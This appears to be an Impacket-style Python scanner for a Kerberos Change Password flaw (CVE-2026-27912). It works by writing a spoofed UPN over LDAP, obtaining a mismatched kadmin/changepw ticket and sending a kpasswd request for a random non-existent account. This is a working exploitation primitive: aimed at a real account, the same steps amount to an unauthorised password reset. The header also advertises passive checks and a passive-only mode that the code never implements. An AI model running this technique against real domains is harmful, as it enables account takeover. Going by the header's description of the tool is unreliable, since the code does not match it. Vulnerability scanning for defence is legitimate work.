#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# ResetNightmare (CVE-2026-27912) vulnerability scanner - NON-DESTRUCTIVE.
#
# The vuln: the Kerberos Change Password service (kadmin/changepw, RFC 3244)
# accepts a TGT whose cname does not match its PAC requestor SID, because the
# PAC_REQUESTOR consistency check only exists on the TGS-REQ path.
#
# Detection idea (behavioral, nothing is ever changed):
#   1. Write a fake UPN on an account we control (UPNUser), equal to a
#      RANDOM NON-EXISTENT account name (probe principal).
#   2. AS-REQ as NT_ENTERPRISE '<probe>' for kadmin/changepw using UPNUser's
#      password -> a TGT whose cname is the probe but whose PAC carries
#      UPNUser's SID ("mismatched ticket").
#   3. Clear the fake UPN (opsec; original UPN is restored afterwards).
#   4. Send a kpasswd change for the probe cname and classify the answer:
#        result 3 (target user not found) or 4 (policy SOFTERROR)
#            -> the KDC CONSUMED the mismatched ticket and went on to look up
#               the account / enforce policy  ==> VULNERABLE
#        Kerberos-level ticket rejection / access denied (5)
#            -> the PAC_REQUESTOR check (2026-04 patch) fired  ==> PATCHED
#      Since the probe account does not exist, no password can ever be set:
#      the test cannot modify anything. Ticket files are never written.
#
# Passive checks (no credentials needed beyond a domain account):
#   - ms-DS-MachineAccountQuota
#   - DC operating system / build (informational)
#
# FOR AUTHORIZED SECURITY TESTING ONLY.
#
# Examples:
#   # passive only
#   ./scanner.py 'union.local/awei:Passw0rd!' --dc-ip 192.168.13.74
#
#   # full behavioral probe (needs UPN-write on --upn-user)
#   ./scanner.py 'union.local/awei:Passw0rd!' --dc-ip 192.168.13.74 \
#       --upn-user bytes --upn-user-password 'Puppet#2026'
#
#   # hash auth (operator + puppet)
#   ./scanner.py 'union.local/awei' -hashes :<NT> --dc-ip 192.168.13.74 \
#       --upn-user bytes --upn-user-hash <NT>
#

import argparse
import getpass
import logging
import random
import string
import sys
import time

from impacket import version
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.kpasswd import changePassword, KPasswdError
from impacket.ldap import ldap as ldap_impacket
from impacket.ldap.ldapasn1 import SearchResultEntry


class Scanner:
    def __init__(self, domain, username, password, dcIp, upnUser=None, upnUserPass=None,
                 lmhash='', nthash='', upnLmhash='', upnNthash=''):
        self.domain = domain
        self.username = username
        self.password = password
        self.dcIp = dcIp
        self.upnUser = upnUser
        self.upnUserPass = upnUserPass
        self.lmhash = lmhash
        self.nthash = nthash
        self.upnLmhash = upnLmhash
        self.upnNthash = upnNthash
        self.baseDN = ','.join('DC=%s' % p for p in domain.split('.'))
        self.ldapConn = None

    def ldapConnect(self):
        self.ldapConn = ldap_impacket.LDAPConnection('ldap://%s' % self.dcIp,
                                                     self.baseDN, self.dcIp)
        self.ldapConn.login(self.username, self.password, self.domain,
                            self.lmhash, self.nthash)

    def searchOne(self, searchFilter, attributes, searchBase=None):
        resp = self.ldapConn.search(searchBase=searchBase, searchFilter=searchFilter,
                                    attributes=attributes)
        for item in resp:
            if isinstance(item, SearchResultEntry):
                return item
        return None

    @staticmethod
    def attr(item, name):
        for attr in item['attributes']:
            if str(attr['type']).lower() == name.lower() and len(attr['vals']) > 0:
                return str(attr['vals'][0])
        return None

    # -------------------------------------------------------------- PROBE
    def probe(self):
        logging.info('Starting behavioral probe (non-destructive)')
        probe = 'rnscan' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        logging.info('%-38s -> %s' % ('Probe account (non-existent)', probe))

        item = self.searchOne('(sAMAccountName=%s)' % self.upnUser,
                              ['distinguishedName', 'userPrincipalName'])
        if item is None:
            raise Exception("Couldn't find --upn-user %s" % self.upnUser)
        upnDN = str(item['objectName'])
        oldUPN = self.attr(item, 'userPrincipalName')

        ticket = None
        try:
            self.ldapConn.modify(upnDN, {'userPrincipalName':
                                 [(ldap_impacket.MODIFY_REPLACE, [probe])]})
            time.sleep(1)
            logging.info('%-38s -> OK' % ("Set fake UPN '%s' on %s" % (probe, self.upnUser)))

            client = Principal(probe, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
            tgt, cipher, _, sessionKey = getKerberosTGT(client, self.upnUserPass or '',
                                                        self.domain,
                                                        self.upnLmhash, self.upnNthash, '',
                                                        kdcHost=self.dcIp,
                                                        serverName='kadmin/changepw')
            logging.info('%-38s -> OK' % 'Got mismatched changepw TGT')
            ticket = {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}
        finally:
            self.ldapConn.modify(upnDN, {'userPrincipalName':
                                 [(ldap_impacket.MODIFY_DELETE, [])]})
            time.sleep(1)
            if oldUPN:
                self.ldapConn.modify(upnDN, {'userPrincipalName':
                                     [(ldap_impacket.MODIFY_REPLACE, [oldUPN])]})
            logging.info('%-38s -> OK' % 'Cleaned up & restored UPN')

        logging.info('%-38s' % 'kpasswd probe (account does not exist)')
        try:
            changePassword(probe, self.domain, 'Zz#9scanProbe' + str(random.randint(10, 99)),
                           TGT=ticket, kdcHost=self.dcIp)
            return ('VULNERABLE', 'password change unexpectedly succeeded '
                    '(should be impossible for a non-existent account)')
        except KPasswdError as e:
            msg = str(e)
            if 'target user was not found' in msg:
                logging.info('%-38s -> %s' % ('KDC answer', 'result 3 (target user not found)'))
                return ('VULNERABLE',
                        'KDC consumed the mismatched ticket and proceeded to the account '
                        'lookup (result 3: target not found). The PAC_REQUESTOR check is '
                        'NOT enforced on the kpasswd path -> CVE-2026-27912 present.')
            if 'SOFTERROR' in msg or 'policy' in msg.lower():
                logging.info('%-38s -> %s' % ('KDC answer', 'result 4 (policy SOFTERROR)'))
                return ('VULNERABLE',
                        'KDC consumed the mismatched ticket and enforced password policy '
                        '(result 4). PAC_REQUESTOR not checked -> vulnerable.')
            if 'access denied' in msg:
                logging.info('%-38s -> %s' % ('KDC answer', 'result 5 (access denied)'))
                return ('PATCHED',
                        'kpasswd returned access denied (result 5) - the ticket was '
                        'rejected before account lookup, consistent with the 2026-04 '
                        'PAC_REQUESTOR enforcement.')
            return ('INCONCLUSIVE', 'unmapped kpasswd result: %s' % msg)
        except Exception as e:
            msg = '%s: %s' % (type(e).__name__, e)
            logging.info('%-38s -> %s' % ('KDC answer', msg))
            if 'TGT_REVOKED' in msg or 'AP_ERR' in msg or 'MODIFIED' in msg:
                return ('PATCHED',
                        'the mismatched ticket was rejected at the Kerberos layer '
                        '(%s) - consistent with a patched KDC.' % msg)
            return ('INCONCLUSIVE', msg)


def parse_identity(identity):
    domain, username, password = '', identity, ''
    if '/' in username:
        domain, username = username.split('/', 1)
    if ':' in username:
        username, password = username.split(':', 1)
    if domain == '':
        raise SystemExit('Identity must include the domain: domain/user[:password]')
    return domain, username, password


def main():
    print(version.BANNER)

    parser = argparse.ArgumentParser(
        description='ResetNightmare (CVE-2026-27912) non-destructive vulnerability scanner')
    parser.add_argument('identity', help='[domain/]username[:password] - any domain account')
    parser.add_argument('--dc-ip', required=True, help='domain controller IP')
    parser.add_argument('--upn-user',
                        help='account you can write a UPN on (enables the behavioral probe)')
    parser.add_argument('--upn-user-password',
                        help='cleartext password of --upn-user (prompted if omitted)')
    parser.add_argument('-hashes', metavar='LMHASH:NTHASH',
                        help='NTLM hashes for the operator identity (LDAP auth)')
    parser.add_argument('--upn-user-hash', metavar='[LMHASH:]NTHASH',
                        help='NT hash of --upn-user (Kerberos pre-auth, RC4)')
    parser.add_argument('-ts', action='store_true', help='add timestamps to output')
    parser.add_argument('-debug', action='store_true', help='debug output')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    logger.init(options.ts)
    logging.getLogger().setLevel(logging.DEBUG if options.debug else logging.INFO)

    domain, username, password = parse_identity(options.identity)
    lmhash = nthash = ''
    if options.hashes:
        lmhash, nthash = options.hashes.split(':', 1)
    if not password and not nthash:
        password = getpass.getpass('Password: ')
    upnPass = None
    upnLm = upnNt = ''
    if options.upn_user_hash:
        if ':' in options.upn_user_hash:
            upnLm, upnNt = options.upn_user_hash.split(':', 1)
        else:
            upnLm, upnNt = 'aad3b435b51404eeaad3b435b51404ee', options.upn_user_hash
    if options.upn_user:
        if not (options.upn_user_password or upnNt):
            upnPass = getpass.getpass('UPNUser password: ')
        else:
            upnPass = options.upn_user_password

    scanner = Scanner(domain, username, password, options.dc_ip,
                      options.upn_user, upnPass,
                      lmhash=lmhash, nthash=nthash,
                      upnLmhash=upnLm, upnNthash=upnNt)
    try:
        scanner.ldapConnect()
    except Exception as e:
        logging.error('LDAP bind failed: %s' % e)
        sys.exit(1)

    try:
        if not options.upn_user:
            logging.info('nothing to do: provide --upn-user (an account you can write a '
                         'UPN on) to run the behavioral probe.')
            return
        verdict, reason = scanner.probe()
        if verdict == 'VULNERABLE':
            print('[+] Target is VULNERABLE (CVE-2026-27912)')
        elif verdict == 'PATCHED':
            print('[-] Target is NOT VULNERABLE (patched)')
        else:
            print('[?] Target status: INCONCLUSIVE')
        logging.debug('verdict reason: %s' % reason)
    except Exception as e:
        logging.error(str(e))
        if options.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
